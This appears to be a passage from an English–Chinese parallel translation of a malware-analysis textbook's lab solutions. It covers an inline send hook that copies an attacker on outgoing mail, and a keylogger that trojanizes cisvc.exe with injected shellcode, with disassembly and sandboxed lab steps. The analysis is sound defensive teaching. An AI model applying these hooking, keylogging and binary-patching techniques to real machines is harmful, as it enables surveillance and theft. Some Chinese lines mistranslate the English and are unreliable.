  zh: 这里是钩子操作的摘要（如图11-4L所示，前面已高阶展示）：
- en: 
  id: totrans-3332
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The program calls the send function.
  id: totrans-3333
  prefs: []
  type: TYPE_NORMAL
  zh: 程序调用send函数。
- en: 
  id: totrans-3334
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The first instruction of the send function transfers execution to sub_1000113D.
  id: totrans-3335
  prefs: []
  type: TYPE_NORMAL
  zh: send函数的第一条指令将执行权转移到sub_1000113D。
- en: 
  id: totrans-3336
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: sub_1000113D manipulates the outgoing buffer only if it contains a RCPT TO
  id: totrans-3337
  prefs: []
  type: TYPE_NORMAL
  zh: sub_1000113D仅在包含RCPT TO的输出缓冲区中操纵。
- en: string.
  id: totrans-3338
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串。
- en: 
  id: totrans-3339
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: sub_1000113D calls the trampoline code located on the heap and pointed to by
    dword_10003484\.
  id: totrans-3340
  prefs: []
  type: TYPE_NORMAL
  zh: sub_1000113D调用位于堆上并由dword_10003484指向的跳板代码。
- en: 
  id: totrans-3341
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The trampoline code executes the first three original instructions of the send
    function (which it overwrote to install the hook).
  id: totrans-3342
  prefs: []
  type: TYPE_NORMAL
  zh: 跳板代码执行发送函数的前三个原始指令（它覆盖了以安装钩子）。
- en: 
  id: totrans-3343
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The trampoline code jumps back to the send function 5 bytes in, so that send
    can function normally.
  id: totrans-3344
  prefs: []
  type: TYPE_NORMAL
  zh: 跳板代码在发送函数中跳回5个字节，以便发送可以正常工作。
- en: '**Examining the Hook in OllyDbg**'
  id: totrans-3345
  prefs: []
  type: TYPE_NORMAL
  zh: '**在OllyDbg中检查钩子**'
- en: We can examine the inline hook using OllyDbg by installing the malware and then
    launching Outlook Express. (Outlook Express is bundled with Microsoft Windows
    XP and runs as *msimn.exe*.) We attach to the process using Solutions to Labs
  id: totrans-3346
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过安装恶意软件并启动Outlook Express来使用OllyDbg检查内联钩子。（Outlook Express包含在Microsoft
    Windows XP中，并以*mSIMN.EXE*运行。）我们使用“解决方案到实验室”附加到该进程。
- en: '**579**'
  id: totrans-3347
  prefs: []
  type: TYPE_NORMAL
  zh: '**579**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3348
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 128](index-613_1.png)'
  id: totrans-3349
  prefs: []
  type: TYPE_IMG
  zh: '![Image 128](index-613_1.png)'
- en: '**File****Attach** and selecting *msimn.exe* from the process listing. Attaching
    to a process immediately pauses all of the threads. If we examine the memory map,
    we see that *spoolvxx32.dll* is loaded in the process because it is an AppInit_DLLs
    value.'
  id: totrans-3350
  prefs: []
  type: TYPE_NORMAL
  zh: '**文件****附加**并从进程列表中选择*spoolvxx32.dll*。附加到进程会立即暂停所有线程。如果我们检查内存映射，我们会看到*spoolvxx32.dll*被加载到该进程中，因为它是一个AppInit_DLLs值。'
- en: Next, we examine send by pressing CTRL-G and entering **send** in the text box.
    Figure 11-5L shows the start of the send function with the jmp hook to sub_1000113D.
    (If you like, you can set a breakpoint at this jump and analyze the code during
    runtime.)
  id: totrans-3351
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们通过按CTRL-G并在文本框中输入**send**来检查发送。图11-5L显示了发送函数的开始，其中包含跳转到sub_1000113D的jmp钩子。（如果您愿意，您可以在这个跳转处设置断点并在运行时分析代码。）
- en: '*Figure 11-5L: Examining the inline hook for the send* *function in* msimn.exe'
  id: totrans-3352
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-5L：在msimn.exe中检查发送* *函数的内联钩子*'
- en: '**Capturing the Network Traffic**'
  id: totrans-3353
  prefs: []
  type: TYPE_NORMAL
  zh: '**捕获网络流量**'
- en: 'To capture this malware in action and see how it manipulates network traffic,
    set up a safe environment as follows:'
  id: totrans-3354
  prefs: []
  type: TYPE_NORMAL
  zh: 为了捕获此恶意软件的实际操作并查看它如何操纵网络流量，按照以下安全环境设置：
- en: 1\.
  id: totrans-3355
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Turn on host-only networking in your virtual machine.
  id: totrans-3356
  prefs: []
  type: TYPE_NORMAL
  zh: 在您的虚拟机上开启仅主机网络。
- en: 2\.
  id: totrans-3357
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Install the malware on your virtual machine with the command **rundll32.exe
    Lab11-02.exe,installer**.
  id: totrans-3358
  prefs: []
  type: TYPE_NORMAL
  zh: 使用命令**rundll32.exe Lab11-02.exe,installer**在您的虚拟机上安装恶意软件。
- en: 3\.
  id: totrans-3359
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: Copy *Lab11-02.ini* into *C:\Windows\System32\*.
  id: totrans-3360
  prefs: []
  type: TYPE_NORMAL
  zh: 将*Lab11-02.ini*复制到*C:\Windows\System32\*。
- en: 4\.
  id: totrans-3361
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: Launch Wireshark and start capturing packets on the virtual machine network
    interface.
  id: totrans-3362
  prefs: []
  type: TYPE_NORMAL
  zh: 启动Wireshark并在虚拟机网络接口上开始捕获数据包。
- en: 5\.
  id: totrans-3363
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: Set up Outlook Express to send email to the host system.
  id: totrans-3364
  prefs: []
  type: TYPE_NORMAL
  zh: 将Outlook Express配置为向主机系统发送电子邮件。
- en: 6\.
  id: totrans-3365
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: Run a fake mail server on your host machine with the command **python**
  id: totrans-3366
  prefs: []
  type: TYPE_NORMAL
  zh: 在您的主机机器上运行一个假邮件服务器，命令为**python**
- en: '**-m smtpd -n -c DebuggingServer *IP*****:25**, where *IP* is the IP address
    of the host machine.'
  id: totrans-3367
  prefs: []
  type: TYPE_NORMAL
  zh: '**-m smtpd -n -c DebuggingServer *IP*****:25**，其中*IP*是主机的IP地址。'
- en: 7\.
  id: totrans-3368
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: Send an email from Outlook Express.
  id: totrans-3369
  prefs: []
  type: TYPE_NORMAL
  zh: 从Outlook Express发送一封电子邮件。
- en: 8\.
  id: totrans-3370
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: Review the packet capture in Wireshark and select **Follow TCP Stream** on the
    email message.
  id: totrans-3371
  prefs: []
  type: TYPE_NORMAL
  zh: 在Wireshark中查看数据包捕获，并在电子邮件消息上选择**跟随TCP流**。
- en: '**Summary**'
  id: totrans-3372
  prefs: []
  type: TYPE_NORMAL
  zh: '**总结**'
- en: Lab 11-2 is a malicious DLL that exports installer, which installs the malware
    persistently using AppInit_DLLs, causing the malware to be loaded into most processes.
    The malware checks to see if it is loaded into a mail client by using a preset
    list of process names to target. If the malware determines that it is running
    inside one of these processes, it will act as a user-mode rootkit by installing
    an inline hook for the send function. The hook takes the form of a jmp instruction
    placed at the beginning of the send function. The hook executes a function that
    scans every data buffer passed to the send function and **580**
  id: totrans-3373
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室11-2是一个恶意DLL，它导出安装程序，通过使用AppInit_DLLs持久安装恶意软件，导致恶意软件被加载到大多数进程中。恶意软件通过使用预置的进程名称列表来检查它是否被加载到邮件客户端中。如果恶意软件确定它正在这些进程之一中运行，它将作为用户模式rootkit通过为发送函数安装内联钩子来行动。钩子的形式是在发送函数开始处的jmp指令。钩子执行一个函数，该函数扫描传递给发送函数的每个数据缓冲区，并**580**
- en: Appendix C
  id: totrans-3374
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3375
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: searches for RCPT TO. If the malware finds the RCPT TO string, it inserts an
    additional RCPT TO containing an email address retrieved by decoding *Lab11-02.ini*,
    essentially copying the malware author on every email sent from the targeted email
    programs.
  id: totrans-3376
  prefs: []
  type: TYPE_NORMAL
  zh: 搜索 RCPT TO。如果恶意软件找到 RCPT TO 字符串，它将插入一个包含通过解码 *Lab11-02.ini* 获取的电子邮件地址的附加 RCPT
    TO，实际上是将恶意软件作者复制到从目标电子邮件程序发送的每封电子邮件中。
- en: '**Lab 11-3 Solutions**'
  id: totrans-3377
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 11-3 解决方案**'
- en: '***Short Answers***'
  id: totrans-3378
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-3379
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: '*Lab11-03.exe* contains the strings inet_epar32.dll and net start cisvc, which
    means that it probably starts the CiSvc indexing service. *Lab11-03.dll* contains
    the string C:\WINDOWS\System32\kernel64x.dll and imports the API calls GetAsyncKeyState
    and GetForegroundWindow, which makes us suspect it is a keylogger that logs to
    *kernel64x.dll*.'
  id: totrans-3380
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-03.exe* 包含字符串 inet_epar32.dll 和 net start cisvc，这意味着它可能启动 CiSvc 索引服务。*Lab11-03.dll*
    包含字符串 C:\WINDOWS\System32\kernel64x.dll 并导入了 API 调用 GetAsyncKeyState 和 GetForegroundWindow，这使我们怀疑它是一个将记录到
    *kernel64x.dll* 的键盘记录器。'
- en: 2\.
  id: totrans-3381
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The malware starts by copying *Lab11-03.dll* to *inet_epar32.dll* in the Windows
    system directory. The malware writes data to *cisvc.exe* and starts the indexing
    service. The malware also appears to write keystrokes to *C:\* *Windows\System32\kernel64x.dll*.
  id: totrans-3382
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件首先将 *Lab11-03.dll* 复制到 Windows 系统目录中的 *inet_epar32.dll*。恶意软件将数据写入 *cisvc.exe*
    并启动索引服务。恶意软件似乎还将按键写入到 *C:\* *Windows\System32\kernel64x.dll*。
- en: 3\.
  id: totrans-3383
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The malware persistently installs *Lab11-03.dll* by trojanizing the indexing
    **1 1**
  id: totrans-3384
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通过将索引服务 **1 1** 木马化来持续安装 *Lab11-03.dll*。
- en: service by entry-point redirection. It redirects the entry point to run shellcode,
    which loads the DLL.
  id: totrans-3385
  prefs: []
  type: TYPE_NORMAL
  zh: 通过入口点重定向提供服务。它将入口点重定向以运行shellcode，该shellcode加载DLL。
- en: 4\.
  id: totrans-3386
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: The malware infects *cisvc.exe* to load *inet_epar32.dll* and call its export
    zzz69806582\.
  id: totrans-3387
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件感染了 *cisvc.exe* 以加载 *inet_epar32.dll* 并调用其导出 zzz69806582\.
- en: 5\.
  id: totrans-3388
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: '*Lab11-03.dll* is a polling keylogger implemented in its export zzz69806582\.'
  id: totrans-3389
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-03.dll* 是一个在导出 zzz69806582\ 中实现的轮询键盘记录器。'
- en: 6\.
  id: totrans-3390
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: The malware stores keystrokes and the window into which keystrokes were entered
    to *C:\Windows\System32\kernel64x.dll*.
  id: totrans-3391
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将按键和按键输入的窗口存储到 *C:\Windows\System32\kernel64x.dll*。
- en: '***Detailed Analysis***'
  id: totrans-3392
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We’ll begin our analysis by examining the strings and imports for *Lab11-03.exe*
    and *Lab11-03.dll*. *Lab11-03.exe* contains the strings inet_epar32.dll and net
    start cisvc. The net start command is used to start a service on a Windows machine,
    but we don’t yet know why the malware would be starting the indexing service on
    the system, so we’ll dig down during in-depth analysis.
  id: totrans-3393
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将开始分析，检查 *Lab11-03.exe* 和 *Lab11-03.dll* 的字符串和导入。*Lab11-03.exe* 包含字符串 inet_epar32.dll
    和 net start cisvc。net start 命令用于在Windows机器上启动服务，但我们还不知道恶意软件为什么要启动系统上的索引服务，因此我们将在深入分析中进一步挖掘。
- en: '*Lab11-03.dll* contains the string C:\WINDOWS\System32\kernel64x.dll and imports
    the API calls GetAsyncKeyState and GetForegroundWindow, which makes us suspect
    it is a keylogger that logs keystrokes to *kernel64x.dll*. The DLL also contains
    an oddly named export: zzz69806582\.'
  id: totrans-3394
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-03.dll* 包含字符串 C:\WINDOWS\System32\kernel64x.dll 并导入了 API 调用 GetAsyncKeyState
    和 GetForegroundWindow，这使我们怀疑它是一个将按键记录到 *kernel64x.dll* 的键盘记录器。该DLL还包含一个奇特命名的导出：zzz69806582\.'
- en: Next, we use dynamic analysis techniques to see what the malware does at runtime.
    We set up procmon and filter on *Lab11-03.exe* to see the malware create *C:\Windows\System32\inet_epar32.dll*.
    The DLL *inet_epar32.dll* is identical to *Lab11-03.dll*, which tells us that
    the malware copies *Lab11-03.dll* to the Windows system directory.
  id: totrans-3395
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用动态分析技术来查看恶意软件在运行时的行为。我们设置 procmon 并筛选 *Lab11-03.exe* 以查看恶意软件创建 *C:\Windows\System32\inet_epar32.dll*。DLL
    *inet_epar32.dll* 与 *Lab11-03.dll* 相同，这告诉我们恶意软件将 *Lab11-03.dll* 复制到 Windows 系统目录。
- en: Further in the procmon output, we see the malware open a handle to *cisvc.exe*,
    but we don’t see any WriteFile operations.
  id: totrans-3396
  prefs: []
  type: TYPE_NORMAL
  zh: 在 procmon 输出中进一步查看，我们看到恶意软件打开对 *cisvc.exe* 的句柄，但我们没有看到任何 WriteFile 操作。
- en: Solutions to Labs
  id: totrans-3397
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**581**'
  id: totrans-3398
  prefs: []
  type: TYPE_NORMAL
  zh: '**581**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3399
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Finally, the malware starts the indexing service by issuing the command net
    start cisvc. Using Process Explorer, we see that *cisvc.exe* is now running on
    the system. Since we suspect that the malware might be logging keystrokes, we
    open *notepad.exe* and enter a bunch of *a* characters. We see that *kernel64x.dll*
    is created. Suspecting that keystrokes are logged, we open *kernel64x.dll* in
    a hex editor and see the following output:'
  id: totrans-3400
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，恶意软件通过执行命令 net start cisvc 启动索引服务。使用进程资源管理器，我们看到 *cisvc.exe* 现在正在系统上运行。由于我们怀疑恶意软件可能正在记录按键，我们打开
    *notepad.exe* 并输入一串 *a* 字符。我们看到生成了 *kernel64x.dll*。怀疑按键已被记录，我们在十六进制编辑器中打开 *kernel64x.dll*
    并看到以下输出：
- en: 'Untitled - Notepad: 0x41'
  id: totrans-3401
  prefs: []
  type: TYPE_NORMAL
  zh: '未命名 - 记事本: 0x41'
- en: 'Untitled - Notepad: 0x41'
  id: totrans-3402
  prefs: []
  type: TYPE_NORMAL
  zh: '未命名 - 记事本: 0x41'
- en: 'Untitled - Notepad: 0x41'
  id: totrans-3403
  prefs: []
  type: TYPE_NORMAL
  zh: '未命名 - 记事本: 0x41'
- en: 'Untitled - Notepad: 0x41'
  id: totrans-3404
  prefs: []
  type: TYPE_NORMAL
  zh: '未命名 - 记事本: 0x41'
- en: Our keystrokes have been logged to *kernel64x.dll*. We also see that the program
    in which we typed our keystrokes (Notepad) has been logged along with the keystroke
    data in hexadecimal. (The malware doesn’t turn the hexadecimal values into readable
    strings, so the malware author probably has a postprocessing script to more easily
    read what is entered.) Next, we use in-depth techniques to determine why the malware
    is starting a service and how the keylogger is gaining execution. We begin by
    loading *Lab11-03.exe* into IDA Pro and examining the main function, as shown
    in Listing 11-17L.
  id: totrans-3405
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的按键已被记录到 *kernel64x.dll*。我们还看到，我们输入按键的程序（记事本）以及按键数据以十六进制形式被记录下来。（恶意软件没有将十六进制值转换为可读字符串，因此恶意软件作者可能有一个后处理脚本来更容易地读取输入的内容。）接下来，我们使用深入的技术来确定恶意软件为什么启动服务以及键盘记录器是如何获得执行的。我们首先将
    *Lab11-03.exe* 加载到 IDA Pro 中，并检查主函数，如图 11-17L 所示。
- en: 004012DB push offset NewFileName ; "C:\\WINDOWS\\System32\\ inet_epar32.dll"
  id: totrans-3406
  prefs: []
  type: TYPE_NORMAL
  zh: 004012DB push offset NewFileName ; "C:\\WINDOWS\\System32\\ inet_epar32.dll"
- en: 004012E0 push offset ExistingFileName ; "Lab11-03.dll"
  id: totrans-3407
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E0 push offset ExistingFileName ; "Lab11-03.dll"
- en: 004012E5 call ds:CopyFileA 
  id: totrans-3408
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E5 call ds:CopyFileA 
- en: 004012EB push offset aCisvc_exe ; "cisvc.exe"
  id: totrans-3409
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EB push offset aCisvc_exe ; "cisvc.exe"
- en: 004012F0 push offset Format ; "C:\\WINDOWS\\System32\\%s"
  id: totrans-3410
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F0 push offset Format ; "C:\\WINDOWS\\System32\\%s"
- en: 004012F5 lea eax, [ebp+FileName]
  id: totrans-3411
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F5 lea eax, [ebp+FileName]
- en: 004012FB push eax ; Dest
  id: totrans-3412
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FB push eax ; 目标
- en: 004012FC call _sprintf
  id: totrans-3413
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FC call _sprintf
- en: 00401301 add esp, 0Ch
  id: totrans-3414
  prefs: []
  type: TYPE_NORMAL
  zh: 00401301 add esp, 0Ch
- en: 00401304 lea ecx, [ebp+FileName]
  id: totrans-3415
  prefs: []
  type: TYPE_NORMAL
  zh: 00401304 lea ecx, [ebp+FileName]
- en: 0040130A push ecx ; lpFileName 0040130B call sub_401070 
  id: totrans-3416
  prefs: []
  type: TYPE_NORMAL
  zh: 0040130A push ecx ; lpFileName 0040130B call sub_401070 
- en: 00401310 add esp, 4
  id: totrans-3417
  prefs: []
  type: TYPE_NORMAL
  zh: 00401310 add esp, 4
- en: 00401313 push offset aNetStartCisvc ; "net start cisvc" 
  id: totrans-3418
  prefs: []
  type: TYPE_NORMAL
  zh: 00401313 push offset aNetStartCisvc ; "net start cisvc" 
- en: 00401318 call system
  id: totrans-3419
  prefs: []
  type: TYPE_NORMAL
  zh: 00401318 call system
- en: '*Listing 11-17L: Reviewing the main method of* Lab11-03.exe At , we see that
    the main method begins by copying *Lab11-03.dll* to *inet_epar32.dll* in *C:\Windows\System32*.
    Next, it builds the string C:\WINDOWS\ System32\cisvc.exe and passes it to sub_401070
    at . Finally, the malware starts the indexing service by using system to run
    the command net start cisvc at .'
  id: totrans-3420
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-17L: 检查 Lab11-03.exe 的主方法* 在 ，我们看到主方法首先将 *Lab11-03.dll* 复制到 *C:\Windows\System32*
    中的 *inet_epar32.dll*。然后，它构建字符串 C:\WINDOWS\ System32\cisvc.exe 并将其传递给  中的 sub_401070。最后，恶意软件通过使用
    system 运行命令 net start cisvc 在  中启动索引服务。'
- en: We focus on sub_401070 to see what it might be doing with *cisvc.exe*. There
    is a lot of confusing code in sub_401070, so take a high-level look at this function
    using the cross-reference diagram shown in Figure 11-6L.
  id: totrans-3421
  prefs: []
  type: TYPE_NORMAL
  zh: 我们关注 sub_401070，看看它可能对 *cisvc.exe* 做了什么。sub_401070 中有很多令人困惑的代码，所以使用图 11-6L 中的交叉引用图从高层次查看这个函数。
- en: '**582**'
  id: totrans-3422
  prefs: []
  type: TYPE_NORMAL
  zh: '**582**'
- en: Appendix C
  id: totrans-3423
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3424
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 129](index-616_1.png)'
  id: totrans-3425
  prefs: []
  type: TYPE_IMG
  zh: '![Image 129](index-616_1.png)'
- en: '*Figure 11-6L: Cross-reference graph for sub_401070*'
  id: totrans-3426
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-6L: sub_401070 的交叉引用图*'
- en: Using this diagram, we see that sub_401070 maps the *cisvc.exe* file into memory
    in order to manipulate it with calls to CreateFileA, CreateFileMappingA, and MapViewOfFile.
    All of these functions open the file for read and write access.
  id: totrans-3427
  prefs: []
  type: TYPE_NORMAL
  zh: 使用此图，我们看到 sub_401070 将 *cisvc.exe* 文件映射到内存中，以便通过调用 CreateFileA、CreateFileMappingA
    和 MapViewOfFile 来操作它。所有这些函数都为读写访问打开文件。
- en: The starting address of the memory-mapped view returned by MapViewOfFile (labeled
    lpBaseAddress by IDA Pro) is both read and written to. Any changes made to this
    file will be written to disk after the call to UnmapViewOfFile, which explains
    why we didn’t see a WriteFile function in the procmon output.
  id: totrans-3428
  prefs: []
  type: TYPE_NORMAL
  zh: MapViewOfFile 返回的内存映射视图的起始地址（由 IDA Pro 标记为 lpBaseAddress）既被读取也被写入。对文件所做的任何更改将在调用
    UnmapViewOfFile 后写入磁盘，这解释了为什么我们没有在 procmon 输出中看到 WriteFile 函数。
- en: Several calculations and checks appear to be made on the PE header of *cisvc.exe*.
    Rather than analyze these complex manipulations, let’s focus on the data written
    to the file, and then extract the version of *cisvc.exe* written to disk for analysis.
  id: totrans-3429
  prefs: []
  type: TYPE_NORMAL
  zh: 在 *cisvc.exe* 的PE头部似乎进行了几个计算和检查。而不是分析这些复杂的操作，让我们专注于写入文件的数据，然后提取写入磁盘的 *cisvc.exe*
    版本进行分析。
- en: A buffer is written to the memory-mapped file, as shown in Listing 11-18L.
  id: totrans-3430
  prefs: []
  type: TYPE_NORMAL
  zh: 如列表11-18L所示，将缓冲区写入内存映射文件。
- en: '**1 1**'
  id: totrans-3431
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 1**'
- en: 0040127C mov edi, [ebp+lpBaseAddress] 
  id: totrans-3432
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127C mov edi, [ebp+lpBaseAddress] 
- en: 0040127F add edi, [ebp+var_28]
  id: totrans-3433
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127F add edi, [ebp+var_28]
- en: 00401282 mov ecx, 4Eh
  id: totrans-3434
  prefs: []
  type: TYPE_NORMAL
  zh: 00401282 mov ecx, 4Eh
- en: 00401287 mov esi, offset byte_409030 
  id: totrans-3435
  prefs: []
  type: TYPE_NORMAL
  zh: 00401287 mov esi, offset byte_409030 
- en: 0040128C rep movsd
  id: totrans-3436
  prefs: []
  type: TYPE_NORMAL
  zh: 0040128C rep movsd
- en: '*Listing 11-18L: Writing 312 bytes of shellcode into* cisvc.exe At , the mapped
    location of the file is moved into EDI and adjusted by some offset using var_28\.
    Next, ECX is loaded with 0x4E, the number of DWORDs to write (movsd). Therefore,
    the total number of bytes is 0x4E * 4 = 312'
  id: totrans-3437
  prefs: []
  type: TYPE_NORMAL
  zh: '**列表11-18L：将312字节的壳代码写入cisvc.exe** 在 ，文件映射位置被移动到EDI，并通过var_28进行调整。接下来，ECX被加载为0x4E，即要写入的DWORD数量（movsd）。因此，总字节数为0x4E
    * 4 = 312'
- en: bytes in decimal. Finally, byte_409030 is moved into ESI at , and rep movsd
    copies the data at byte_409030 into the mapped file. We examine the data at 0x409030
    and see the bytes in the left side of Table 11-1L.
  id: totrans-3438
  prefs: []
  type: TYPE_NORMAL
  zh: 十进制字节。最后，byte_409030被移动到ESI的，rep movsd将byte_409030中的数据复制到映射文件中。我们检查0x409030处的数据，并看到表11-1L左侧的字节。
- en: '**Table 11-1L:** The Shellcode Written to *cisvc.exe* **Raw bytes**'
  id: totrans-3439
  prefs: []
  type: TYPE_NORMAL
  zh: '**表11-1L：写入cisvc.exe的壳代码** **原始字节**'
- en: '**Disassembly**'
  id: totrans-3440
  prefs: []
  type: TYPE_NORMAL
  zh: '**反汇编**'
- en: 00409030 unk_409030 db 55h
  id: totrans-3441
  prefs: []
  type: TYPE_NORMAL
  zh: 00409030 unk_409030 db 55h
- en: 00409030 push ebp
  id: totrans-3442
  prefs: []
  type: TYPE_NORMAL
  zh: 00409030 push ebp
- en: 00409031 db 89h
  id: totrans-3443
  prefs: []
  type: TYPE_NORMAL
  zh: 00409031 db 89h
- en: 00409031 mov ebp, esp
  id: totrans-3444
  prefs: []
  type: TYPE_NORMAL
  zh: 00409031 mov ebp, esp
- en: 00409032 db 0E5h
  id: totrans-3445
  prefs: []
  type: TYPE_NORMAL
  zh: 00409032 db 0E5h
- en: 00409033 sub esp, 40h
  id: totrans-3446
  prefs: []
  type: TYPE_NORMAL
  zh: 00409033 sub esp, 40h
- en: 00409033 db 81h
  id: totrans-3447
  prefs: []
  type: TYPE_NORMAL
  zh: 00409033 db 81h
- en: 00409039 jmp loc_409134
  id: totrans-3448
  prefs: []
  type: TYPE_NORMAL
  zh: 00409039 jmp loc_409134
- en: 00409034 db 0ECh
  id: totrans-3449
  prefs: []
  type: TYPE_NORMAL
  zh: 00409034 db 0ECh
- en: 00409035 db 40h
  id: totrans-3450
  prefs: []
  type: TYPE_NORMAL
  zh: 00409035 db 40h
- en: The left side of the table contains raw bytes, but if we put the cursor at 0x409030
    and press C in IDA Pro, we get the disassembly shown in the right side of the
    table. This is shellcode—handcrafted assembly that, in this case, is Solutions
    to Labs
  id: totrans-3451
  prefs: []
  type: TYPE_NORMAL
  zh: 表格的左侧包含原始字节，但如果我们把光标放在0x409030处，并在IDA Pro中按C键，我们就会得到表格右侧显示的反汇编代码。这是壳代码——手工汇编代码，在这种情况下，是实验室解决方案
- en: '**583**'
  id: totrans-3452
  prefs: []
  type: TYPE_NORMAL
  zh: '**583**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3453
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 130](index-617_1.png)'
  id: totrans-3454
  prefs: []
  type: TYPE_IMG
  zh: '![Image 130](index-617_1.png)'
- en: used for process injection. Rather than analyze the shellcode (doing so can
    be a bit complicated and messy), we’ll guess at what it does based on the strings
    it contains.
  id: totrans-3455
  prefs: []
  type: TYPE_NORMAL
  zh: 用于进程注入。而不是分析壳代码（这样做可能有点复杂和混乱），我们将根据它包含的字符串来猜测它的功能。
- en: 'Toward the end of the 312 bytes of shellcode, we see two strings: 00409139
    aCWindowsSystem db ''C:\WINDOWS\System32\inet_epar32.dll'',0'
  id: totrans-3456
  prefs: []
  type: TYPE_NORMAL
  zh: 在312字节壳代码的末尾，我们看到两个字符串：00409139 aCWindowsSystem db 'C:\WINDOWS\System32\inet_epar32.dll',0
- en: 0040915D aZzz69806582 db 'zzz69806582',0
  id: totrans-3457
  prefs: []
  type: TYPE_NORMAL
  zh: 0040915D aZzz69806582 db 'zzz69806582',0
- en: The appearance of the path to *inet_epar32.dll* and the export zzz69806582
  id: totrans-3458
  prefs: []
  type: TYPE_NORMAL
  zh: '*inet_epar32.dll* 路径和导出 zzz69806582 的出现'
- en: suggest that this shellcode loads the DLL and calls its export.
  id: totrans-3459
  prefs: []
  type: TYPE_NORMAL
  zh: 表明此壳代码加载DLL并调用其导出。
- en: 'Next, we compare the *cisvc.exe* binary as it exists after we run the malware
    to a clean version that existed before the malware was run. (Most hex editors
    provide a comparison tool.) Comparing the versions, we see two differences: the
    insertion of 312 bytes of shellcode and only a 2-byte change in the PE'
  id: totrans-3460
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将运行恶意软件后存在的 *cisvc.exe* 二进制文件与恶意软件运行之前存在的干净版本进行比较。（大多数十六进制编辑器都提供比较工具。）比较这两个版本，我们发现有两个不同点：插入312字节的壳代码和在PE中的2字节更改
- en: header. We load both of these binaries into PEview to see if we notice a difference
    in the PE header. This comparison is shown in Figure 11-7L.
  id: totrans-3461
  prefs: []
  type: TYPE_NORMAL
  zh: 头部。我们将这两个二进制文件都加载到PEview中，看看我们是否注意到PE头部有差异。这种比较在图11-7L中显示。
- en: '*Figure 11-7L: PEview of original and trojanized versions of* cisvc.exe The
    top part of Figure 11-7L shows the original *cisvc.exe* (named *cisvc_original.exe*)
    loaded into PEview, and the bottom part shows the trojanized *cisvc.exe*. At 
    and , we see that the entry point differs in the two binaries. If we load both
    binaries into IDA Pro, we see that the malware has performed entry-point redirection
    so that the shellcode runs before the original entry point any time that *cisvc.exe*
    is launched. Listing 11-19L shows a snippet of the shellcode in the trojanized
    version of *cisvc.exe*.'
  id: totrans-3462
  prefs: []
  type: TYPE_NORMAL
